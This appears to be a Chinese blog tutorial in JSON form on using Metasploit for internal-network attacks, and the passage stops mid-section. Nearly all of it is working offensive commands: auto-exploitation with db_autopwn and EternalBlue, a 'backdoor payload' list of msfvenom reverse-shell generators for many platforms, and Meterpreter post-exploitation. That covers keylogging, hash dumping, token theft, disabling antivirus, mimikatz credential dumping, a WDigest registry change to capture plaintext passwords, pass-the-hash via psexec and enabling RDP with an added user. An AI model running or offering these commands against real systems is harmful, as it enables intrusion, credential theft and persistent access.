{"title":"Metasploit内网篇","uid":"11f36b4318769a873345492b90cb8350","slug":"Metasploit内网篇","date":"2022-10-06T14:00:44.000Z","updated":"2022-10-06T14:01:51.809Z","comments":true,"path":"api/articles/Metasploit内网篇.json","keywords":null,"cover":"https://gss0.baidu.com/-4o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/f2deb48f8c5494ee94b313482af5e0fe98257ec9.jpg","content":"<pre class=\"line-numbers language-none\"><code class=\"language-none\">#常用命令\nsessions -K 结束全部会话<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h1 id=\"1-数据库后端\"><a class=\"markdownIt-Anchor\" href=\"#1-数据库后端\">#</a> 1、数据库后端</h1>\n<p>关于数据库操作：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">db_connect\ndb_disconnect\ndb_export\ndb_import\ndb_nmap\ndb_rebuild_cache\ndb_remove\ndb_save\ndb_status<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915212758022.png\" alt=\"image-20220915212758022\"></p>\n<ul>\n<li>启动 postgresql 数据库</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">service</span> postgresql start <span class=\"token comment\">#启动服务</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">service</span> postgresql status <span class=\"token comment\">#查看服务状态</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">netstat</span> -antpo <span class=\"token comment\">#查看端口</span>\n<span class=\"token function\">sudo</span> msfdb init <span class=\"token comment\">#初始化数据库</span>\n<span class=\"token function\">sudo</span> msfdb reinit <span class=\"token comment\">#重新初始化数据库</span>\n<span class=\"token comment\"># 数据库初始化成功后会产生一个/usr/share/metasploit-framework/config/database.yml文件</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><mark>注意究极大坑：postgresql 需要在环境为 en-US 情况下使用，否则会无法开启 5432 监听，解决方法为修改 terminal 编码或者系统语言</mark></li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916215226763.png\" alt=\"image-20220916215226763\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916211215954.png\" alt=\"image-20220916211215954\"></p>\n<ul>\n<li>使用 msfconsole 的 db_connection 连接数据库</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msf6 <span class=\"token operator\">></span> db_connect -y /usr/share/metasploit-framework/config/database.yml <span class=\"token comment\">#使用数据库文件进行连接</span>\nmsf6 <span class=\"token operator\">></span> db_status <span class=\"token comment\">#查看连接状态</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916215359154.png\" alt=\"image-20220916215359154\"></p>\n<ul>\n<li>使用 db_nmap 对主机进行扫描，db_nmap 和 nmap 的使用方法相同</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msf6 <span class=\"token operator\">></span> db_nmap <span class=\"token number\">10.10</span>.10.135 -sV -A <span class=\"token comment\">#对常用端口进行扫描</span>\nmsf6 <span class=\"token operator\">></span> services <span class=\"token comment\">#查看已存在的db_nmap服务，可查看所有扫描结果</span>\nmsf6 <span class=\"token operator\">></span> services --help <span class=\"token comment\">#查看帮助手册</span>\nmsf6 <span class=\"token operator\">></span> services -d IP <span class=\"token comment\">#删除指定IP的扫描记录</span>\nmsf6 <span class=\"token operator\">></span> db_nmap <span class=\"token number\">10.10</span>.10.0/24 -p <span class=\"token number\">445</span> <span class=\"token comment\">#扫描C段445端口</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916220159392.png\" alt=\"image-20220916220159392\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916220231372.png\" alt=\"image-20220916220231372\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916220656179.png\" alt=\"image-20220916220656179\"></p>\n<ul>\n<li>hosts 查看已扫描过的 IP</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msf6 <span class=\"token operator\">></span> hosts <span class=\"token comment\">#查看已扫描过的IP</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916220716095.png\" alt=\"image-20220916220716095\"></p>\n<h2 id=\"12-配合db_autopwn对主机实现自动攻击\"><a class=\"markdownIt-Anchor\" href=\"#12-配合db_autopwn对主机实现自动攻击\">#</a> 1.2 配合 db_autopwn 对主机实现自动攻击</h2>\n<ul>\n<li>db_autopwn：<a href=\"https://github.com/hahwul/metasploit-autopwn\">GitHub - hahwul/metasploit-autopwn: db_autopwn plugin of metasploit</a></li>\n<li>将文件上传到 kali 桌面，执行 cp 命令导入到 msf 目录下</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">cp</span> db_autopwn.rb /usr/share/metasploit-framework/plugins<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>使用 msf 导入插件</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msf6 <span class=\"token operator\">></span> load db_autopwn<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>使用 autopwn 进行攻击</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msf6 <span class=\"token operator\">></span> db_autopwn <span class=\"token comment\">#查看帮助文档</span>\nmsf6 <span class=\"token operator\">></span> db_autopwn -p -R great -e -q IP <span class=\"token comment\">#指定IP进行扫描</span>\nmsf6 <span class=\"token operator\">></span> db_autopwn -p -R great -e -q <span class=\"token comment\">#如果不指定IP，默认扫描hosts已存的所有主机</span>\n<span class=\"token comment\"># 因为有防火墙的原因，建议使用指定EXP攻击指定端口服务</span>\ndb_autopwn -p -m exploit/windows/smb/ms17_010_eternalblue -e <span class=\"token comment\">#指定模块进行攻击</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"2-msf生成后门\"><a class=\"markdownIt-Anchor\" href=\"#2-msf生成后门\">#</a> 2、msf 生成后门</h1>\n<h2 id=\"21-msfvenom\"><a class=\"markdownIt-Anchor\" href=\"#21-msfvenom\">#</a> 2.1 msfvenom</h2>\n<ul>\n<li>\n<p>msfvenom：攻击载荷生成和编码器</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#主要参数</span>\n-p payload-e 编码方式-i 编码次数-b 在生成的程序中避免出现的值LHOST,LPORT 监听\n上线的主机IP和端口-f exe 生成EXE格式使用msfvenom -l 可以查看可以利用payloadmsfvenom -l\n<span class=\"token operator\">|</span> <span class=\"token function\">grep</span> windows <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> x64 <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> tcp 选择payload<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n</ul>\n<h2 id=\"22-生成可执行文件\"><a class=\"markdownIt-Anchor\" href=\"#22-生成可执行文件\">#</a> 2.2 生成可执行文件</h2>\n<ul>\n<li>后门 payload 大全</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#Linux:</span>\nmsfvenom -p linux/x86/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your Port to Connect On<span class=\"token operator\">></span> -f elf <span class=\"token operator\">></span> shell.elf\nmsfvenom -p linux/x64/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your Port to Connect On<span class=\"token operator\">></span> -f elf <span class=\"token operator\">></span> shell.elf\n<span class=\"token comment\">#Windows:</span>\nmsfvenom -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>YourPort to Connect On<span class=\"token operator\">></span> -f exe <span class=\"token operator\">></span> shell.exe\nmsfvenom -p windows/x64/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>YourPort to Connect On<span class=\"token operator\">></span> -f exe <span class=\"token operator\">></span> shell.exe\n<span class=\"token comment\">#Mac:</span>\nmsfvenom -p osx/x86/shell_reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your Port to Connect On<span class=\"token operator\">></span> -f macho <span class=\"token operator\">></span> shell.macho\nmsfvenom -p osx/x64/shell_reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your Port to Connect On<span class=\"token operator\">></span> -f macho <span class=\"token operator\">></span> shell.macho\n<span class=\"token comment\">#PHP:</span>\nmsfvenom -p php/meterpreter_reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your Port to Connect On<span class=\"token operator\">></span> -f raw <span class=\"token operator\">></span> shell.php\n<span class=\"token function\">cat</span> shell.php <span class=\"token operator\">|</span> pbcopy <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'&lt;?php '</span> <span class=\"token operator\">|</span> <span class=\"token function\">tr</span> -d <span class=\"token string\">'\\n'</span> <span class=\"token operator\">></span> shell.php <span class=\"token operator\">&amp;&amp;</span> pbpaste <span class=\"token operator\">>></span> shell.php\n<span class=\"token comment\">#ASP:</span>\nmsfvenom -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your\nPort to Connect On<span class=\"token operator\">></span> -f asp <span class=\"token operator\">></span> shell.asp\n<span class=\"token comment\">#JSP:</span>\nmsfvenom -p java/jsp_shell_reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your Port to Connect On<span class=\"token operator\">></span> -f raw <span class=\"token operator\">></span> shell.jsp\n<span class=\"token comment\">#WAR:</span>\nmsfvenom -p java/jsp_shell_reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your Port to Connect On<span class=\"token operator\">></span> -f war <span class=\"token operator\">></span> shell.war\n<span class=\"token comment\">#Python:</span>\nmsfvenom -p cmd/unix/reverse_python <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your Port to Connect On<span class=\"token operator\">></span> -f raw <span class=\"token operator\">></span> shell.py\n<span class=\"token comment\">#Bash:</span>\nmsfvenom -p cmd/unix/reverse_bash <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your Port to Connect On<span class=\"token operator\">></span> -f raw <span class=\"token operator\">></span> shell.sh\n<span class=\"token comment\">#Perl:</span>\nmsfvenom -p cmd/unix/reverse_perl <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your IP Address<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>Your Port to Connect On<span class=\"token operator\">></span> -f raw <span class=\"token operator\">></span> shell.pl<span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"23-开启监听\"><a class=\"markdownIt-Anchor\" href=\"#23-开启监听\">#</a> 2.3 开启监听</h2>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfconsole\nmsf6 <span class=\"token operator\">></span> use exploit/multi/handler <span class=\"token comment\">#使用监听模块</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> show options <span class=\"token comment\">#查看参数</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> show advanced <span class=\"token comment\">#查看高级参数</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">4444</span> <span class=\"token comment\">#设置监听端口</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">10.10</span>.10.132 <span class=\"token comment\">#设置监听IP</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> payload windows/x64/meterpreter/reverse_tcp <span class=\"token comment\">#设置payload，与2.2生成文件的payload相同</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> exploit <span class=\"token comment\">#执行监听</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220917105406805.png\" alt=\"image-20220917105406805\"></p>\n<h2 id=\"24-扩展监听命令\"><a class=\"markdownIt-Anchor\" href=\"#24-扩展监听命令\">#</a> 2.4 扩展监听命令</h2>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> exploit -j -z <span class=\"token comment\">#-j：将会话作为job开始运行，可执行jobs查看所有会话；-z：不立即执行session交换，可后台运行</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> ExitOnSession <span class=\"token boolean\">false</span> <span class=\"token comment\">#让connection保持连接(即使一个连接退出,仍然保持listening状态)</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> PrependMigrate <span class=\"token boolean\">true</span> <span class=\"token comment\">#自动添加新进程</span>\n<span class=\"token comment\">#启动msf时自动开启监听</span>\nmsfconsole -x <span class=\"token string\">\"use exploit/multi/handler; set payload windows/meterpreter/reverse_http; set lhost 127.0.0.1; set lport 1234; exploit -j;\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220917105817281.png\" alt=\"image-20220917105817281\"></p>\n<h2 id=\"25-会话操作\"><a class=\"markdownIt-Anchor\" href=\"#25-会话操作\">#</a> 2.5 会话操作</h2>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> background <span class=\"token comment\">#将会话放置到后台</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> sessions <span class=\"token comment\">#查看所有会话</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> sessions <span class=\"token number\">1</span> <span class=\"token comment\">#选择指定会话</span>\nmsf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> sessions -k <span class=\"token number\">1</span> <span class=\"token comment\">#结束指定会话</span>\nCtrl+z <span class=\"token comment\">#把会话放到后台</span>\nCtrl+c <span class=\"token comment\">#结束会话</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"3-meterpreter后渗透\"><a class=\"markdownIt-Anchor\" href=\"#3-meterpreter后渗透\">#</a> 3、Meterpreter 后渗透</h1>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> background 放回后台\nmeterpreter <span class=\"token operator\">></span> <span class=\"token builtin class-name\">exit</span> 关闭会话\nmeterpreter <span class=\"token operator\">></span> <span class=\"token builtin class-name\">help</span> 帮助信息\nmeterpreter <span class=\"token operator\">></span> Sysinfo 系统平台信息\nmeterpreter <span class=\"token operator\">></span> screenshot 屏幕截取\nmeterpreter <span class=\"token operator\">></span> shell 命令行shell <span class=\"token punctuation\">(</span>exit退出<span class=\"token punctuation\">)</span>\nmeterpreter <span class=\"token operator\">></span> getlwd 查看本地目录\nmeterpreter <span class=\"token operator\">></span> lcd 切换本地目录\nmeterpreter <span class=\"token operator\">></span> <span class=\"token builtin class-name\">pwd</span> 查看目录\nmeterpreter <span class=\"token operator\">></span> <span class=\"token function\">ls</span> 查看文件目录列表\nmeterpreter <span class=\"token operator\">></span> <span class=\"token builtin class-name\">cd</span> 切换目录\nmeterpreter <span class=\"token operator\">></span> <span class=\"token function\">rm</span> 删除文件\nmeterpreter <span class=\"token operator\">></span> download C:<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>Users<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span><span class=\"token number\">123</span><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>Desktop<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span><span class=\"token number\">1</span>.txt <span class=\"token number\">1</span>.txt 下载文件\nmeterpreter <span class=\"token operator\">></span> upload /var/www/wce.exe wce.exe 上传文件\nmeterpreter <span class=\"token operator\">></span> search -d c: -f *.doc 搜索文件\nmeterpreter <span class=\"token operator\">></span> execute -f cmd.exe -i 执行程序/命令\nmeterpreter <span class=\"token operator\">></span> <span class=\"token function\">ps</span> 查看进程\nmeterpreter <span class=\"token operator\">></span> run post/windows/capture/keylog_recorder 键盘记录\nmeterpreter <span class=\"token operator\">></span> getuid 查看当前用户权限\nmeterpreter <span class=\"token operator\">></span> use priv 加载特权模块\nmeterpreter <span class=\"token operator\">></span> getsystem 提升到SYSTEM权限\nmeterpreter <span class=\"token operator\">></span> hashdump 导出密码散列\nmeterpreter <span class=\"token operator\">></span> <span class=\"token function\">ps</span> 查看高权限用户PID\nmeterpreter <span class=\"token operator\">></span> steal_token <span class=\"token operator\">&lt;</span>PID<span class=\"token operator\">></span> 窃取令牌\nmeterpreter <span class=\"token operator\">></span> rev2self 恢复原来的令牌\nmeterpreter <span class=\"token operator\">></span> migrate pid 迁移进程\nmeterpreter <span class=\"token operator\">></span> run killav 关闭杀毒软件\nmeterpreter <span class=\"token operator\">></span> run getgui-e 启用远程桌面\nmeterpreter <span class=\"token operator\">></span> portfwd <span class=\"token function\">add</span> -l <span class=\"token number\">1234</span> -p <span class=\"token number\">3389</span> -r <span class=\"token operator\">&lt;</span>目标IP<span class=\"token operator\">></span> 端口转发\nmeterpreter <span class=\"token operator\">></span> run get_local_subnets 获取内网网段信息\nmeterpreter <span class=\"token operator\">></span> run autoroute -s <span class=\"token operator\">&lt;</span>内网网段<span class=\"token operator\">></span> 创建自动路由\nmeterpreter <span class=\"token operator\">></span> run autoroute -p 查看自动路由表\n创建代理通道:\nmsf <span class=\"token operator\">></span> use auxiliary/server/socks4a 设置socks4代理模块\nmsf auxiliary<span class=\"token punctuation\">(</span>socks4a<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> show options\nmsf auxiliary<span class=\"token punctuation\">(</span>socks4a<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> run\n配置proxychains参数：\n<span class=\"token function\">nano</span> /etc/proxychains.conf 修改代理监听端口,和前面端口一致\nquite_mode 设置成安静模式：去掉如下参数前面的注释<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"31-常用命令\"><a class=\"markdownIt-Anchor\" href=\"#31-常用命令\">#</a> 3.1 常用命令</h2>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> run post/windows/capture/keylog_recorder <span class=\"token comment\">#记录键盘，CTRL+C结束后会保存到一个txt文件中</span>\nmeterpreter <span class=\"token operator\">></span> screenshot <span class=\"token comment\">#屏幕截取</span>\nmeterpreter <span class=\"token operator\">></span> hashdump <span class=\"token comment\">#导出密码散列</span>\nmeterpreter <span class=\"token operator\">></span> run hashdump <span class=\"token comment\">#导出密码散列</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"32-kiwi使用\"><a class=\"markdownIt-Anchor\" href=\"#32-kiwi使用\">#</a> 3.2 kiwi 使用</h2>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> load kiwi <span class=\"token comment\">#导入kiwi模块</span>\nmeterpreter <span class=\"token operator\">></span> kiwi --help <span class=\"token comment\">#查看帮助手册</span>\nmeterpreter <span class=\"token operator\">></span> creds_all <span class=\"token comment\">#导出所有凭证</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">creds_all：列举所有凭据\ncreds_kerberos：列举所有kerberos凭据\ncreds_msv：列举所有msv凭据\ncreds_ssp：列举所有ssp凭据\ncreds_tspkg：列举所有tspkg凭据\ncreds_wdigest：列举所有wdigest凭据\ndcsync：通过DCSync检索用户帐户信息\ndcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID\ngolden_ticket_create：创建黄金票据\nkerberos_ticket_list：列举kerberos票据\nkerberos_ticket_purge：清除kerberos票据\nkerberos_ticket_use：使用kerberos票据\nkiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令\nlsa_dump_sam：dump出lsa的SAM\nlsa_dump_secrets：dump出lsa的密文\npassword_change：修改密码\nwifi_list：列出当前用户的wifi配置文件\nwifi_list_shared：列出共享wifi配置文件/编码\n\ncreds_all <span class=\"token comment\">#该命令可以列举系统中的明文密码</span>\nkiwi_cmd\nkiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令\nkiwi_cmd sekurlsa::logonpasswords <span class=\"token comment\">#类似mimikatz获取全部信息</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>提示：在 Windows2012 系统及以上的系统，默认在内存缓存中禁止保存明文密码的。攻击者可以通过修改注册表的方式抓取明文，需要用户重新登录后才能成功抓取。</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"33-windows-shell乱码解决\"><a class=\"markdownIt-Anchor\" href=\"#33-windows-shell乱码解决\">#</a> 3.3 windows shell 乱码解决</h2>\n<ul>\n<li>进入 shell 后使用  <code>chcp 65001</code>  解决</li>\n</ul>\n<h2 id=\"34-psexec登录内网主机\"><a class=\"markdownIt-Anchor\" href=\"#34-psexec登录内网主机\">#</a> 3.4 psexec 登录内网主机</h2>\n<ul>\n<li>连接 meterpreter 后门后进程迁移或提权到 system，使用 hashdump 导出 hash</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> migrate <span class=\"token number\">334</span>\nmeterpreter <span class=\"token operator\">></span> hashdump<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<ul>\n<li>使用 smb_version 或在 meterpreter 中 run 搜索模块进行 445 端口扫描</li>\n<li>使用 <code>exploit/windows/smb/psexec</code>  模块进行攻击</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">info exploit/windows/smb/psexec <span class=\"token comment\">#查看模块信息</span>\nuse exploit/windows/smb/psexec <span class=\"token comment\">#使用模块</span>\nshow options <span class=\"token comment\">#查看选项</span>\nuse exploit/windows/smb/psexec <span class=\"token comment\">#设置payload</span>\n<span class=\"token builtin class-name\">set</span> SMBUser administrator <span class=\"token comment\">#设置攻击用户</span>\n<span class=\"token builtin class-name\">set</span> rhosts <span class=\"token number\">10.10</span>.10.135 <span class=\"token comment\">#设置攻目标IP，可设置C段</span>\n<span class=\"token builtin class-name\">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 <span class=\"token comment\">#设置hash</span>\n<span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_tcp <span class=\"token comment\">#设置payload</span>\n<span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">10.10</span>.10.139 <span class=\"token comment\">#设置监听主机IP</span>\n<span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">6666</span> <span class=\"token comment\">#设置监听端口</span>\nexploit<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"35-开启远程终端\"><a class=\"markdownIt-Anchor\" href=\"#35-开启远程终端\">#</a> 3.5 开启远程终端</h2>\n<ul>\n<li>getgui 模块 —— 用于开启远程终端</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">meterpreter <span class=\"token operator\">></span> run getgui -e <span class=\"token comment\">#开启远程终端</span>\nmeterpreter <span class=\"token operator\">></span> run post/windows/manage/enable_rdp\nmeterpreter <span class=\"token operator\">></span> run getgui -u m -p QWEasd123 <span class=\"token comment\">#添加本地用户，再手动添加管理员</span>\nrdesktop <span class=\"token number\">127.0</span>.0.1:1234 <span class=\"token comment\">#连接目标IP远程终端</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"36-端口转发\"><a class=\"markdownIt-Anchor\" 